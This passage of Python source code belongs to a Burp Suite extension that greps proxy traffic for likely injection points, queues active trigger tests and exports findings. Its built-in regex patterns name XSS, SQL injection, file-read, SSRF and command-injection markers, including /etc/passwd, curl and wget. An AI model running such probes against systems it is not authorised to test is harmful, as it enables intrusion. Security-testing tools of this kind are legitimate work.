        SwingUtilities.invokeLater(SwingRun(upd))

    def createMenuItems(self, invocation):
        menus = ArrayList()
        item = JMenuItem("Send to GF+Trigger")
        item.addActionListener(lambda e: self.analyze_messages(invocation.getSelectedMessages()))
        menus.add(item)

        test_item = JMenuItem("Test this endpoint (all params)")
        test_item.addActionListener(lambda e: self._test_endpoint_all_params(invocation.getSelectedMessages()))
        menus.add(test_item)

        stealth_item = JMenuItem("Send to GF (Stealth - no payloads)")
        stealth_item.addActionListener(lambda e: self._stealth_analyze_messages(invocation.getSelectedMessages()))
        menus.add(stealth_item)
        return menus

    def _stealth_analyze_messages(self, messages):
        old_stealth = self.stealth_mode
        old_trigger = self.trigger_enabled
        self.stealth_mode = True
        self.trigger_enabled = False
        try:
            for msg in messages:
                self.analyze_message(msg)
        finally:
            self.stealth_mode = old_stealth
            self.trigger_enabled = old_trigger

    def _test_endpoint_all_params(self, messages):
        for msg in messages:
            try:
                req_info = self.helpers.analyzeRequest(msg)
                url = req_info.getUrl()
                if not self._is_in_scope(url.getHost()):
                    continue
                host = str(url.getHost()).lower()
                if self._is_blacklisted_domain(host):
                    self._log("[Skip] Blacklisted domain in endpoint test: %s" % host)
                    continue
                grep_params = []
                for p in req_info.getParameters():
                    pt = int(p.getType())
                    pname = p.getName()
                    if pt in self.ALLOWED_PARAM_TYPES and pname.lower() not in self.BORING_PARAMS:
                        grep_params.append((pname, p.getValue() or "", pt, pt == 6))
                json_targets = self._extract_json_targets(msg, req_info)
                for jname, jval in json_targets:
                    if jname.lower() not in self.BORING_PARAMS:
                        grep_params.append((jname, jval, 6, True))
                if not grep_params:
                    continue
                for name in self.patterns:
                    matched_params = [p[0] for p in grep_params]
                    if self.trigger_enabled and not self.stealth_mode:
                        u = url.toString()
                        m = req_info.getMethod()
                        msg_copy = msg
                        ri = req_info
                        gp = list(grep_params)
                        mp = set(matched_params)
                        self.trigger_executor.submit(lambda n=name, u=u, m=m, msg=msg_copy, ri=ri, gp=gp, mp=mp:
                            self._two_stage_trigger(n, u, m, msg, ri, gp, mp))
                self.status.setText("Testing endpoint: %s" % url.toString())
            except Exception as e:
                self._log("[TestEndpoint] Error: %s" % str(e))

    def analyze_messages(self, msgs):
        for msg in msgs:
            self.analyze_message(msg)

    def _populate_variants(self, tab, key):
        while tab.variant_model.getRowCount() > 0:
            tab.variant_model.removeRow(0)
        tab.variant_instances = []
        for inst in tab.uniques[key]['instances']:
            tab.variant_instances.append(inst)
            tab.variant_model.addRow([
                inst['id'], inst['status'], inst['length'], inst['full_params'], inst['match']
            ])
        if tab.variant_model.getRowCount() > 0:
            tab.variant_table.setRowSelectionInterval(0,0)

    def _show_finding(self, finding):
        self.current_finding = finding
        self.current_confirmed = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(False)
        msg = finding['message']
        req = msg.getRequest() if msg.getRequest() else self.helpers.stringToBytes("")
        resp = msg.getResponse() if msg.getResponse() else self.helpers.stringToBytes("")
        self.req_editor.setMessage(req, True)
        self.resp_editor.setMessage(resp, False)
        self.status.setText("GF Finding #%d | %s" % (finding['id'], finding['url']))

    def _show_confirmed(self, confirmed):
        self.current_confirmed = confirmed
        self.current_finding = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(True)
        self._refresh_confirmed_editors()
        self.status.setText("CONFIRMED %s #%d | %s | %s" % (
            confirmed['vuln'], confirmed['id'], confirmed['confidence'], confirmed['evidence'][:80]))

    def _show_baseline_change(self, data):
        self.current_finding = None
        self.current_confirmed = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(False)
        canary_req = data.get('canary_request')
        canary_resp = data.get('canary_response')
        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(canary_req if canary_req else empty, True)
        self.resp_editor.setMessage(canary_resp if canary_resp else empty, False)
        self.status.setText("Baseline | %s | %s | Param: %s" % (data['url'], data['method'], data['param']))

    def _show_smart_finding(self, data):
        self.current_finding = None
        self.current_confirmed = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(False)
        req = data.get('trigger_request') if data.get('trigger_request') else self.helpers.stringToBytes("")
        resp = data.get('trigger_response') if data.get('trigger_response') else self.helpers.stringToBytes("")
        self.req_editor.setMessage(req, True)
        self.resp_editor.setMessage(resp, False)
        self.status.setText("Smart | %s | %s | %s" % (data['vuln'], data['confidence'], data['evidence'][:60]))

    def _show_param_analysis(self, data):
        self.current_finding = None
        self.current_confirmed = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(False)
        canary_req = data.get('canary_request')
        canary_resp = data.get('canary_response')
        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(canary_req if canary_req else empty, True)
        self.resp_editor.setMessage(canary_resp if canary_resp else empty, False)
        self.status.setText("Param Analysis | %s | Type: %s" % (data['pname'], data['ptype']))

    def _refresh_confirmed_editors(self):
        if not self.current_confirmed:
            return
        if self.viewing_baseline:
            req = self.current_confirmed['baseline_request']
            resp = self.current_confirmed['baseline_response']
        else:
            req = self.current_confirmed['trigger_request']
            resp = self.current_confirmed['trigger_response']
        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(req if req else empty, True)
        self.resp_editor.setMessage(resp if resp else empty, False)

    def _on_toggle(self, event):
        self.viewing_baseline = self.toggle_btn.isSelected()
        if self.current_confirmed:
            self._refresh_confirmed_editors()
            mode = "BASELINE" if self.viewing_baseline else "TRIGGER"
            self.status.setText("%s | %s #%d | %s" % (mode, self.current_confirmed['vuln'],
                                                      self.current_confirmed['id'],
                                                      self.current_confirmed['evidence'][:80]))
        elif self.current_finding:
            self._show_finding(self.current_finding)

    def _apply_filter(self, event):
        pass

    def _load_builtin_patterns(self):
        self.patterns = {
            'xss': [
                re.compile(r'(<\w+[^>]*\son\w+\s*=|javascript:|data:text/html|<script|<iframe|<svg|alert\(|confirm\(|prompt\()', re.I),
                re.compile(r'(\'|\")\s*>\s*<\s*(svg|img|input|body|details|script)', re.I),
            ],
            'sqli': [
                re.compile(r"(\'|\"|\d+\s*OR\s*\d+\s*=\s*\d+|\d+\s*AND\s*\d+\s*=\s*\d+|UNION\s+SELECT|SLEEP\(|WAITFOR|pg_sleep|benchmark\()", re.I),
            ],
            'lfi': [
                re.compile(r'(\.\./|\.\.\\|/etc/passwd|win\.ini|php://|file://|proc/self|C:\\\\)', re.I),
            ],
            'idor': [
                re.compile(r'^\d+$'),
                re.compile(r'^[0-9a-f]{24}$'),
            ],
            'redirect': [
                re.compile(r'(https?://|//\w+|/\w+\.(com|net|org)|/\w+@\w+)', re.I),
            ],
            'ssrf': [
                re.compile(r'(http://(127|192|10|172|169|0|localhost|169\.254)|file://|dict://|gopher://|ftp://)', re.I),
            ],
            'rce': [
                re.compile(r'(\;|\||\`|\\$\(|\$\{|&gt;|&lt;|\|\s*id|\;\s*id|whoami|nslookup|curl\s|wget\s|ping\s)', re.I),
            ],
            'ssti': [
                re.compile(r'(\{\{.*\}\}|\$\{.*\}|<\%=.*\%>|\{\%.*\%\}|7\*7)', re.I),
            ],
            'nosql': [
                re.compile(r'(\$gt|\$ne|\$regex|\$where|ObjectId|BSON|sleep)', re.I),
            ],
            'crlf': [
                re.compile(r'(%0d|%0a|\\r|\\n)', re.I),
            ],
            'xxe': [
                re.compile(r'(<!DOCTYPE|ENTITY\s+SYSTEM|xxe|file://)', re.I),
            ],
            'xpath': [
                re.compile(r'(\]\|//|\)\s*or\s*\(|\'\s*or\s*\')', re.I),
            ],
            'ldap': [
                re.compile(r'(\*\)\(|objectClass|uid=\*|uid=\))', re.I),
            ],
        }

    def _load_patterns(self, directory):
        self.patterns = {}
        if os.path.isdir(directory):
            for fn in sorted(os.listdir(directory)):
                if fn.endswith('.json') or fn.endswith('.js'):
                    full = os.path.join(directory, fn)
                    try:
                        with open(full, 'r') as fh:
                            data = json.load(fh)
                        name = fn.rsplit('.',1)[0]
                        flags = 0
                        gf_flags = data.get('flags','')
                        if 'i' in gf_flags: flags |= re.IGNORECASE
                        if 'm' in gf_flags: flags |= re.MULTILINE
                        if 's' in gf_flags: flags |= re.DOTALL
                        regex_list = []
                        if 'pattern' in data:
                            regex_list.append(re.compile(data['pattern'], flags))
                        if 'patterns' in data:
                            for p in data['patterns']:
                                regex_list.append(re.compile(p, flags))
                        if regex_list:
                            self.patterns[name] = regex_list
                    except Exception as e:
                        self._log("[GF] Failed %s: %s" % (fn, str(e)))
        if not self.patterns:
            self._load_builtin_patterns()
            self._log("No .gf patterns found. Loaded %d built-in patterns." % len(self.patterns))

    def _rebuild_tabs(self):
        self.gf_tab_pane.removeAll()
        self.tabs_data.clear()
        self.baseline_changes = []
        self.smart_findings = []
        self.param_analysis = []
        self._param_analysis_keys = set()
        self.waf_log = []
        while self.baseline_change_model.getRowCount() > 0:
            self.baseline_change_model.removeRow(0)
        while self.smart_finding_model.getRowCount() > 0:
            self.smart_finding_model.removeRow(0)
        while self.param_analysis_model.getRowCount() > 0:
            self.param_analysis_model.removeRow(0)
        while self.waf_model.getRowCount() > 0:
            self.waf_model.removeRow(0)

        self.confirmed_findings = []
        self.confirmed_counter = 0
        self.findings_counter = 0
        self.current_finding = None
        self.current_confirmed = None
        self._populating_combo = True
        self.jump_combo.removeAllItems()
        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(empty, True)
        self.resp_editor.setMessage(empty, False)

        for name in sorted(self.patterns.keys()):
            self.jump_combo.addItem(name)
            tab = TabData(name)
            self.tabs_data[name] = tab
            um = tab.unique_table.getColumnModel()
            um.getColumn(0).setPreferredWidth(40)
            um.getColumn(1).setPreferredWidth(700)
            um.getColumn(2).setPreferredWidth(100)
            um.getColumn(3).setPreferredWidth(80)
            um.getColumn(4).setPreferredWidth(80)
            um.getColumn(5).setPreferredWidth(380)
            um.getColumn(6).setPreferredWidth(60)
            um.getColumn(7).setPreferredWidth(450)
            vm = tab.variant_table.getColumnModel()
            vm.getColumn(0).setPreferredWidth(40)
            vm.getColumn(1).setPreferredWidth(80)
            vm.getColumn(2).setPreferredWidth(80)
            vm.getColumn(3).setPreferredWidth(500)
            vm.getColumn(4).setPreferredWidth(450)
            tab.unique_table.getSelectionModel().addListSelectionListener(UniqueSelectionListener(self, tab))
            tab.variant_table.getSelectionModel().addListSelectionListener(VariantSelectionListener(self, tab))
            tab.variant_table.addMouseListener(VariantPopupListener(self, tab))
            self.gf_tab_pane.addTab(name, tab.split_pane)

        for i in range(self.main_tab_pane.getTabCount()-1, -1, -1):
            title = self.main_tab_pane.getTitleAt(i)
            if title.startswith("CONFIRMED-"):
                self.main_tab_pane.removeTabAt(i)

        self._populating_combo = False
        self._update_status()

    def _on_browse(self, e):
        chooser = JFileChooser()
        chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY)
        if chooser.showOpenDialog(self.main_panel) == JFileChooser.APPROVE_OPTION:
            path = chooser.getSelectedFile().getAbsolutePath()
            self.dir_field.setText(path)
            self._load_and_refresh(path)

    def _on_reload(self, e):
        self._load_and_refresh(self.dir_field.getText())

    def _load_and_refresh(self, path):
        self._load_patterns(path)
        self._rebuild_tabs()

    def _on_scan(self, e):
        self.scan_btn.setEnabled(False)
        self.status.setText("Scanning proxy history...")
        self.progress.setVisible(True)
        self.progress.setIndeterminate(True)
        Thread(target=self._scan_thread).start()

    def _scan_thread(self):
        try:
            history = self.callbacks.getProxyHistory()
            total = len(history)
            skipped = 0
            for i, msg in enumerate(history):
                try:
                    req_info = self.helpers.analyzeRequest(msg)
                    host = str(req_info.getUrl().getHost()).lower()
                    if self._is_blacklisted_domain(host):
                        skipped += 1
                        if skipped % 100 == 0:
                            self._log("[Scan] Skipped %d blacklisted items so far" % skipped)
                        continue
                    self.analyze_message(msg)
                except Exception as e:
                    pass
                if i % 50 == 0:
                    SwingUtilities.invokeLater(SwingRun(lambda i=i, t=total: self.status.setText("Scanning %d/%d" % (i,t))))
            SwingUtilities.invokeLater(SwingRun(lambda t=total: self.status.setText("Scan complete - %d items" % t)))
        except Exception as e:
            SwingUtilities.invokeLater(SwingRun(lambda: self.status.setText("Scan error: %s" % str(e))))
        finally:
            SwingUtilities.invokeLater(SwingRun(lambda: self.scan_btn.setEnabled(True)))
            SwingUtilities.invokeLater(SwingRun(lambda: self.progress.setVisible(False)))

    def _on_export(self, e):
        chooser = JFileChooser()
        chooser.setSelectedFile(File("gf_smart_findings.csv"))
        if chooser.showSaveDialog(self.main_panel) == JFileChooser.APPROVE_OPTION:
            try:
                f = chooser.getSelectedFile()
                writer = BufferedWriter(FileWriter(f.getAbsolutePath()))

                writer.write("ID,Category,URL,Method,Status,Length,MatchedParams,Match\n")
                for name,tab in self.tabs_data.items():
                    for key,data in tab.uniques.items():
                        for inst in data['instances']:
                            writer.write('%d,%s,%s,%s,%d,%d,%s,%s\n' % (
                                inst['id'], self._csv_escape(name), self._csv_escape(inst['url']),
                                self._csv_escape(inst['method']), inst['status'], inst['length'],
                                self._csv_escape(inst['param']), self._csv_escape(inst['match'])))

                writer.write("\nCONFIRMED FINDINGS\n")
                writer.write("ID,URL,Method,Vuln,Payload,B-Status,P-Status,B-Len,P-Len,Evidence,Confidence\n")
                for c in self.confirmed_findings:
                    writer.write('%d,%s,%s,%s,%s,%d,%d,%d,%d,%s,%s\n' % (
                        c['id'], self._csv_escape(c['url']), self._csv_escape(c['method']),
                        self._csv_escape(c['vuln']), self._csv_escape(c['payload']),
                        c['baseline_status'], c['trigger_status'], c['baseline_len'], c['trigger_len'],
                        self._csv_escape(c['evidence']), self._csv_escape(c['confidence'])))

                writer.write("\nBASELINE CHANGES\n")
                writer.write("URL,Method,Parameter,Canary,B-Status,C-Status,B-Len,C-Len,Diff\n")
                for bc in self.baseline_changes:
                    writer.write('%s,%s,%s,%s,%d,%d,%d,%d,%d\n' % (
                        self._csv_escape(bc['url']), bc['method'], self._csv_escape(bc['param']),
                        self._csv_escape(bc['canary']), bc['b_status'], bc['c_status'],
                        bc['b_len'], bc['c_len'], bc['diff']))

                writer.write("\nSMART FINDINGS\n")
                writer.write("ID,URL,Method,Parameter,Vuln,Confidence,Evidence\n")
                for i, sf in enumerate(self.smart_findings):
                    writer.write('%d,%s,%s,%s,%s,%s,%s\n' % (
                        i+1, self._csv_escape(sf['url']), self._csv_escape(sf['method']),
                        self._csv_escape(sf['param']), self._csv_escape(sf['vuln']),
                        self._csv_escape(sf['confidence']), self._csv_escape(sf['evidence'])))

                writer.write("\nWAF DETECTIONS\n")
                writer.write("Host,WAF_Type,Evidence,Timestamp\n")
                for w in self.waf_log:
                    writer.write('%s,%s,%s,%s\n' % (
                        self._csv_escape(w['host']), self._csv_escape(w['waf']),
                        self._csv_escape(w['evidence']), self._csv_escape(w['ts'])))

                writer.close()
                JOptionPane.showMessageDialog(self.main_panel, "Exported to %s" % f.getAbsolutePath())
            except Exception as ex:
                JOptionPane.showMessageDialog(self.main_panel, "Export failed: %s" % str(ex))

    def _csv_escape(self, s):
        if '"' in s or ',' in s or '\n' in s:
            return '"' + s.replace('"', '""') + '"'
        return s

    def _on_clear(self, e):
        with self._lock:
            for tab in self.tabs_data.values():
                tab.uniques.clear()
                tab.unique_entries = []
                tab.variant_instances = []
            self.confirmed_findings = []
            self.confirmed_counter = 0
            self.findings_counter = 0
            self.baseline_changes = []
            self.smart_findings = []
            self.param_analysis = []
            self._param_analysis_keys = set()
            self.waf_log = []
            for ctab in self.confirmed_tabs.values():
                ctab.findings = []
        for tab in self.tabs_data.values():
            while tab.unique_model.getRowCount() > 0:
                tab.unique_model.removeRow(0)
            while tab.variant_model.getRowCount() > 0:
                tab.variant_model.removeRow(0)
            self._update_tab_title(tab.name)
        for ctab in self.confirmed_tabs.values():
            while ctab.model.getRowCount() > 0:
                ctab.model.removeRow(0)
            idx = self.main_tab_pane.indexOfComponent(ctab.scroll)
            if idx != -1:
                self.main_tab_pane.setTitleAt(idx, "CONFIRMED-%s" % ctab.name)
        while self.baseline_change_model.getRowCount() > 0:
            self.baseline_change_model.removeRow(0)
        while self.smart_finding_model.getRowCount() > 0:
            self.smart_finding_model.removeRow(0)
        while self.param_analysis_model.getRowCount() > 0:
            self.param_analysis_model.removeRow(0)
        while self.waf_model.getRowCount() > 0:
            self.waf_model.removeRow(0)
        self.debug_area.setText("")
        self.current_finding = None
        self.current_confirmed = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(False)
        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(empty, True)
        self.resp_editor.setMessage(empty, False)
        self.tested_params = set()
        self._update_status()
        self.status.setText("Cleared")

    def _on_jump(self, e):
        if self._populating_combo:
            return
        name = self.jump_combo.getSelectedItem()
        if name and name in self.tabs_data:
            idx = self.gf_tab_pane.indexOfComponent(self.tabs_data[name].split_pane)
            if idx != -1:
                self.gf_tab_pane.setSelectedIndex(idx)

    def _update_status(self):
        gf_total = sum(len(u['instances']) for t in self.tabs_data.values() for u in t.uniques.values())
        conf_total = len(self.confirmed_findings)
        self.status.setText("Patterns: %d | GF: %d | Confirmed: %d | Changes: %d" % (
            len(self.patterns), gf_total, conf_total, len(self.baseline_changes)))

    def getHttpService(self):
        if self.current_confirmed:
            return self.current_confirmed['service']
        if self.current_finding:
            return self.current_finding['message'].getHttpService()
        return None

    def getRequest(self):
        if self.current_confirmed:
            if self.viewing_baseline:
                return self.current_confirmed['baseline_request']
            return self.current_confirmed['trigger_request']
        if self.current_finding:
            return self.current_finding['message'].getRequest()
        return None

    def getResponse(self):
        if self.current_confirmed:
            if self.viewing_baseline:
                return self.current_confirmed['baseline_response']
            return self.current_confirmed['trigger_response']
        if self.current_finding:
            return self.current_finding['message'].getResponse()
        return None

    def getTabCaption(self):
        return "GF + Smart v5.1"

    def getUiComponent(self):
        return self.main_panel

    # -------------------------------------------------------------------------
    # Popup action methods (inside class for Jython safety)
    # -------------------------------------------------------------------------
    def _send_variant_to_repeater(self, tab):
        row = tab.variant_table.getSelectedRow()
        if row == -1:
            return
        model_row = tab.variant_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(tab.variant_instances):
            inst = tab.variant_instances[model_row]
            msg = inst['message']
            svc = msg.getHttpService()
            self.callbacks.sendToRepeater(svc.getHost(), svc.getPort(), svc.getProtocol() == "https", msg.getRequest(), None)
            self.status.setText("Sent to Repeater: %s" % inst['url'])

    def _copy_variant_url(self, tab):
        row = tab.variant_table.getSelectedRow()
        if row == -1:
            return
        model_row = tab.variant_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(tab.variant_instances):
            url = tab.variant_instances[model_row]['url']
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
            self.status.setText("URL copied")

    def _send_confirmed_baseline(self, ctab):
        row = ctab.table.getSelectedRow()
        if row == -1:
            return
        model_row = ctab.table.convertRowIndexToModel(row)
        if 0 <= model_row < len(ctab.findings):
            c = ctab.findings[model_row]
            self.callbacks.sendToRepeater(c['service'].getHost(), c['service'].getPort(),
                                          c['service'].getProtocol() == "https",
                                          c['baseline_request'], None)
            self.status.setText("Sent BASELINE to Repeater")

    def _send_confirmed_trigger(self, ctab):
        row = ctab.table.getSelectedRow()
        if row == -1:
            return
        model_row = ctab.table.convertRowIndexToModel(row)
        if 0 <= model_row < len(ctab.findings):
            c = ctab.findings[model_row]
            self.callbacks.sendToRepeater(c['service'].getHost(), c['service'].getPort(),
                                          c['service'].getProtocol() == "https",
                                          c['trigger_request'], None)
            self.status.setText("Sent TRIGGER to Repeater")

    def _copy_confirmed_url(self, ctab):
        row = ctab.table.getSelectedRow()
        if row == -1:
            return
        model_row = ctab.table.convertRowIndexToModel(row)
        if 0 <= model_row < len(ctab.findings):
            url = ctab.findings[model_row]['url']
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
            self.status.setText("URL copied")

    def _send_baseline_to_repeater(self):
        row = self.baseline_change_table.getSelectedRow()
        if row == -1:
            return
        model_row = self.baseline_change_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(self.baseline_changes):
            data = self.baseline_changes[model_row]
            canary_req = data.get('canary_request')
            service = data.get('service')
            if canary_req and service:
                self.callbacks.sendToRepeater(service.getHost(), service.getPort(), service.getProtocol() == "https", canary_req, None)
                self.status.setText("Sent canary to Repeater")

    def _copy_baseline_url(self):
        row = self.baseline_change_table.getSelectedRow()
        if row == -1:
            return
        model_row = self.baseline_change_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(self.baseline_changes):
            url = self.baseline_changes[model_row]['url']
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
            self.status.setText("URL copied")

    def _send_smart_to_repeater(self):
        row = self.smart_finding_table.getSelectedRow()
        if row == -1:
            return
        model_row = self.smart_finding_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(self.smart_findings):
            data = self.smart_findings[model_row]
            svc = data.get('service')
            req = data.get('trigger_request')
            if svc and req:
                self.callbacks.sendToRepeater(svc.getHost(), svc.getPort(), svc.getProtocol() == "https", req, None)
                self.status.setText("Sent smart finding to Repeater")

    def _copy_smart_url(self):
        row = self.smart_finding_table.getSelectedRow()
        if row == -1:
            return
        model_row = self.smart_finding_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(self.smart_findings):
            url = self.smart_findings[model_row]['url']
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
            self.status.setText("URL copied")

    def _send_param_analysis_to_repeater(self):
        row = self.param_analysis_table.getSelectedRow()
        if row == -1:
            return
        model_row = self.param_analysis_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(self.param_analysis):
            data = self.param_analysis[model_row]
            svc = data.get('service')
            req = data.get('canary_request')
            if svc and req:
                self.callbacks.sendToRepeater(svc.getHost(), svc.getPort(), svc.getProtocol() == "https", req, None)
                self.status.setText("Sent param analysis to Repeater")

    def _copy_param_analysis_url(self):
        row = self.param_analysis_table.getSelectedRow()
        if row == -1:
            return
        model_row = self.param_analysis_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(self.param_analysis):
            data = self.param_analysis[model_row]
            msg = data.get('baseline_msg')
            if msg:
                url = self.helpers.analyzeRequest(msg).getUrl().toString()
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
                self.status.setText("URL copied")


# -----------------------------------------------------------------------------
# Listeners
# -----------------------------------------------------------------------------
class UniqueSelectionListener(ListSelectionListener):
    def __init__(self, ext, tab):
        self.ext = ext
        self.tab = tab
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        row = self.tab.unique_table.getSelectedRow()
        if row != -1:
            model_row = self.tab.unique_table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.tab.unique_entries):
                key = self.tab.unique_entries[model_row]
                self.ext._populate_variants(self.tab, key)

class VariantSelectionListener(ListSelectionListener):
    def __init__(self, ext, tab):
        self.ext = ext
        self.tab = tab
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        row = self.tab.variant_table.getSelectedRow()
        if row != -1:
            model_row = self.tab.variant_table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.tab.variant_instances):
                self.ext._show_finding(self.tab.variant_instances[model_row])

class ConfirmedSelectionListener(ListSelectionListener):
    def __init__(self, ext, ctab):
        self.ext = ext
        self.ctab = ctab
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        row = self.ctab.table.getSelectedRow()
        if row != -1:
            model_row = self.ctab.table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.ctab.findings):
                self.ext._show_confirmed(self.ctab.findings[model_row])

class BaselineSelectionListener(ListSelectionListener):
    def __init__(self, ext):
        self.ext = ext
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        row = self.ext.baseline_change_table.getSelectedRow()
        if row != -1:
            model_row = self.ext.baseline_change_table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.ext.baseline_changes):
                self.ext._show_baseline_change(self.ext.baseline_changes[model_row])

class SmartFindingSelectionListener(ListSelectionListener):
    def __init__(self, ext):
        self.ext = ext
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        row = self.ext.smart_finding_table.getSelectedRow()
        if row != -1:
            model_row = self.ext.smart_finding_table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.ext.smart_findings):
                self.ext._show_smart_finding(self.ext.smart_findings[model_row])

class ParamAnalysisSelectionListener(ListSelectionListener):
    def __init__(self, ext):
        self.ext = ext
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        row = self.ext.param_analysis_table.getSelectedRow()
        if row != -1:
            model_row = self.ext.param_analysis_table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.ext.param_analysis):
                self.ext._show_param_analysis(self.ext.param_analysis[model_row])

class VariantPopupListener(MouseAdapter):
    def __init__(self, ext, tab):
        self.ext = ext
        self.tab = tab
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        rep = JMenuItem("Send to Repeater")
        rep.addActionListener(lambda x: self.ext._send_variant_to_repeater(self.tab))
        popup.add(rep)
        url = JMenuItem("Copy URL")
        url.addActionListener(lambda x: self.ext._copy_variant_url(self.tab))
        popup.add(url)
        popup.show(e.getComponent(), e.getX(), e.getY())

class ConfirmedPopupListener(MouseAdapter):
    def __init__(self, ext, ctab):
        self.ext = ext
        self.ctab = ctab
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        b = JMenuItem("Send Baseline to Repeater")
        b.addActionListener(lambda x: self.ext._send_confirmed_baseline(self.ctab))
        popup.add(b)
        p = JMenuItem("Send Trigger to Repeater")
        p.addActionListener(lambda x: self.ext._send_confirmed_trigger(self.ctab))
        popup.add(p)
        c = JMenuItem("Copy URL")
        c.addActionListener(lambda x: self.ext._copy_confirmed_url(self.ctab))
        popup.add(c)
        popup.show(e.getComponent(), e.getX(), e.getY())

class BaselinePopupListener(MouseAdapter):
    def __init__(self, ext):
        self.ext = ext
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        item = JMenuItem("Send Canary to Repeater")
        item.addActionListener(lambda x: self.ext._send_baseline_to_repeater())
        popup.add(item)
        item2 = JMenuItem("Copy URL")
        item2.addActionListener(lambda x: self.ext._copy_baseline_url())
        popup.add(item2)
        popup.show(e.getComponent(), e.getX(), e.getY())

class SmartFindingPopupListener(MouseAdapter):
    def __init__(self, ext):
        self.ext = ext
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        item = JMenuItem("Send to Repeater")
        item.addActionListener(lambda x: self.ext._send_smart_to_repeater())
        popup.add(item)
        item2 = JMenuItem("Copy URL")
        item2.addActionListener(lambda x: self.ext._copy_smart_url())
        popup.add(item2)
        popup.show(e.getComponent(), e.getX(), e.getY())

class ParamAnalysisPopupListener(MouseAdapter):
    def __init__(self, ext):
        self.ext = ext
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        item = JMenuItem("Send Canary to Repeater")
        item.addActionListener(lambda x: self.ext._send_param_analysis_to_repeater())
        popup.add(item)
        item2 = JMenuItem("Copy URL")
        item2.addActionListener(lambda x: self.ext._copy_param_analysis_url())
        popup.add(item2)
        popup.show(e.getComponent(), e.getX(), e.getY())
